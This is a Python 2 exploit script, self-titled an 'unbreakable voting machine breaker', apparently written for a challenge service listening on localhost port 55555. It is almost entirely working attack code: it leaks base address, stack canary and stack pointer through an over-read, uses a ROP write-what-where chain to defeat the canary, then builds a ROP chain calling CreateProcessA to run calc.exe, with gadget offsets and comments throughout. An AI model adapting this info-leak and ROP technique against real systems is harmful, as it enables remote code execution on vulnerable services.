import socket
from time import sleep
from array import array
import struct

def rce(baseadd, canary, stack, otherRop):
	payl = "Hello\0\0\0"
	cmdline = "calc.exe"
	payl += otherRop
	payl += (str(struct.pack("Q",baseadd+0x410D))) #pop rsi (Load the original ret address to rsi)
	payl += (str(struct.pack("Q",baseadd+0x16f0))) #Original ret add
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #Padding
	payl += (str(struct.pack("Q",baseadd+0x1a97))) #mov rax, rsi
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx (Load the original stack pointer address to rbx)
	payl += (str(struct.pack("Q",stack-0x10))) #Original ret stack pointer
	payl += (str(struct.pack("Q",baseadd+0x410A))) #pop r12
	payl += (str(struct.pack("Q",baseadd+0x410E))) #pop rbp and ret (to bypass call in next gadget)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*3 #Padding
	payl += (str(struct.pack("Q",baseadd+0x7c85))) #mov rcx, rax | call r12
	payl += (str(struct.pack("Q",baseadd+0x80cb))) #mov [rbx],rcx
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	payl += (str(struct.pack("Q",baseadd+0x1ca4))) #mov r11, [rsp+08] (Load original RSP on r11)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*1 #Padding
	payl += (str(struct.pack("Q",stack-0x10-8))) #Original ret stack pointer
	payl += (str(struct.pack("Q",baseadd+0x7255))) #mov rsp, r11 | pop rbp | ret
	payl += cmdline
	payl += "\x00"*(4096-len(payl))
	payl1 = "\x66"*4+"q"*(254)+str(struct.pack("Q",canary))+"abcdabcd"*2
	payl1 += str(struct.pack("Q",baseadd+0x2312)) #add rsp,0x158 | ret
	payl1 = struct.pack("H",len(payl1)) + payl1
	print "[*] Sending payload of size: " + str(len(payl))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1",55555))
	s.sendall(payl)
	data = s.recv(1024)
	s.sendall(payl1)
	data = s.recv(1024)
	s.close()

def leakByte(nbyte, base):
	payl = "Hello"
	size = base + nbyte
	payl1 = struct.pack("H",size)+"\x66"*4+"q"*(base-1+nbyte)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1",55555))
	s.sendall(payl)
	data = s.recv(1024)
	s.sendall(payl1)
	data = s.recv(1024)
	data.encode("hex")
	s.close()
	return data[base+nbyte]

def movData(baseadd,source,dest):
	payl = ""
	payl += (str(struct.pack("Q",baseadd+0x410C))) #pop rdi
	payl += "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"*3 #rdi = -1
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx
	payl += (str(struct.pack("Q",source))) #Source
	payl += (str(struct.pack("Q",baseadd+0x2811))) #mov rax,[rbx]
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx
	payl += (str(struct.pack("Q",dest))) #Destination
	payl += (str(struct.pack("Q",baseadd+0x410A))) #pop r12
	payl += (str(struct.pack("Q",baseadd+0x410E))) #pop rbp and ret (to bypass call in next gadget)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*3 #Padding
	payl += (str(struct.pack("Q",baseadd+0x7c85))) #mov rcx, rax | call r12
	payl += (str(struct.pack("Q",baseadd+0x80cb))) #mov [rbx],rcx
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	return payl
	
def WWW(baseadd, what, where):
	payl = ""
	payl += (str(struct.pack("Q",baseadd+0x13d7)))*30 #ret padding
	payl += (str(struct.pack("Q",baseadd+0x410D))) #pop rsi (Save what we want to write on RSI)
	payl += (str(struct.pack("Q",what))) #What we want to write
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #Padding
	payl += (str(struct.pack("Q",baseadd+0x1a97))) #mov rax, rsi
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx (Save on rbx where we want to write it)
	payl += (str(struct.pack("Q",baseadd+where))) #Destination
	payl += (str(struct.pack("Q",baseadd+0x410A))) #pop r12 (The next gadget will call to this address)
	payl += (str(struct.pack("Q",baseadd+0x410E))) #pop rbp and ret (to bypass call in next gadget)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*3 #Padding
	payl += (str(struct.pack("Q",baseadd+0x7c85))) #mov rcx, rax | call r12
	payl += (str(struct.pack("Q",baseadd+0x80cb))) #mov [rbx],rcx (Move our what into our where)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	return payl	

def getCalc(baseadd,stack):
	payl = ""
	restore = movData(leakadd, baseadd+0x11000,stack+0x18)
	rets = 30
	payl += (str(struct.pack("Q",baseadd+0x13d7)))*rets #ret
	payl += (str(struct.pack("Q",baseadd+0x2eb3))) #xor rax, rax
	payl += (str(struct.pack("Q",baseadd+0x410A))) #pop r12
	payl += (str(struct.pack("Q",baseadd+0x410E))) #pop rbp and ret (to bypass call in next gadget)
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*3 #Padding
	payl += (str(struct.pack("Q",baseadd+0x7c85))) #mov rcx, rax | call r12
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx
	payl += (str(struct.pack("Q",baseadd+0xE198))) #CreateprocessA location
	payl += (str(struct.pack("Q",baseadd+0x410C))) #pop rdi
	payl += "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"*3 #rdi = -1
	payl += (str(struct.pack("Q",baseadd+0x2811))) #mov rax,[rbx]
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*5 #Padding
	payl += (str(struct.pack("Q",baseadd+0x410C))) #pop rdi
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*3 #Zero out registers
	payl += (str(struct.pack("Q",baseadd+0x36c1))) #pop rbx
	payl += (str(struct.pack("Q",stack+0x2b0+rets*8+len(restore)))) #CMDLine
	payl += (str(struct.pack("Q",baseadd+0x1bde))) #mov r9, rdi | mov r8, rsi | mov rdx, rbx | call r12
	payl += (str(struct.pack("Q",baseadd+0x7cfa))) #Call Rax
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00"*4 #Shadow space for stdcall x64
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #bInheritHandles
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #bInheritHandles
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #lpEnvironment
	payl += "\x00\x00\x00\x00\x00\x00\x00\x00" #lpCurrentDirectory
	payl += (str(struct.pack("Q",stack+0xC00))) #lpStartupInfo
	payl += (str(struct.pack("Q",stack+0x138+rets*8))) #lpProcessInformation
	payl += (str(struct.pack("Q",baseadd+0x13d7)))*10 #ret
	payl += restore
	return payl

print "Unbreakable voting machine breaker v1.0 by Alejo Popovici (apok)"
print "----------- ------ ------- ------- ---- -- ----- -------- ------"
print ""
print "[*] Leaking base address..."
leakadd = []
for x in range(0,8):
	leakadd.insert(x,(leakByte(x,40)[0]))
leakadd = struct.unpack("Q",''.join(leakadd))[0]
leakadd |= 0xffff
leakadd -= 0xffff

print "[*] Leaking stack canary..."
leakcanary = []
for x in range(0,8):
	leakcanary.insert(x,(leakByte(x,152)[0]))
leakcanary = struct.unpack("Q",''.join(leakcanary))[0] 

print "[*] Leaking stack address..."
leakstack = []
for x in range(0,8):
	leakstack.insert(x,(leakByte(x,192)[0]))
leakstack = struct.unpack("Q",''.join(leakstack))[0] 

leakcanary ^=(leakstack-0x358)
calculated = (leakstack-0x168)^leakcanary

print "[+] Base address = " + hex(leakadd)
print "[+] Stack canary = " + hex(leakcanary)
print "[+] Stack address = " + hex(leakstack)
print "[+] Calculated stack canary = " + hex(calculated)

newcanary = 0
print "[*] Zeroing out canary..."
rop = WWW(leakadd, newcanary, 0x11cd8)
rce(leakadd,calculated,leakstack,rop)
calculated = (leakstack-0x168)
print "[*] Saving SOCKET descriptor..."
rop = movData(leakadd, leakstack+0x18,leakadd+0x11000)
rce(leakadd,calculated,leakstack,rop)
print "[*] Breaking the law..."
rop = getCalc(leakadd, leakstack)
rce(leakadd,calculated,leakstack,rop)